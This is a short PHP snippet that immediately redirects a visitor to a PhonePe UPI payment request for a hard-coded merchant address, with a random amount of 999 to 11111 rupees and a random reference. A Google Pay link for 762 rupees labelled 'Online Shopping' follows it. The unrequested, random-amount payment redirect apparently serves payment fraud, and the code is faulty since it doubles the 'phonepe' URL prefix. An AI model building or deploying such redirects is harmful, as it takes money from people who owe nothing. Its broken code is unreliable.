<?php
    function pay(){
        $url=$phonepeURL = "phonepe://pay?pa=fcbiz8wokw5@freecharge&pn=YDV91806707&tn=YDV" . rand(999, 11111) . "&am=" . rand(999, 11111) . "&cu=INR&mode=02&purpose=00&tr=90157033;end";

    return $url;
    }
    $c_url = "phonepe".pay();
    header('location: '.$c_url);
?>

tez://upi/pay?pa=fcbizae8yvr@freecharge&pn=Online%20Shopping&am=762.00&cu=INR&tn=Online%20Shopping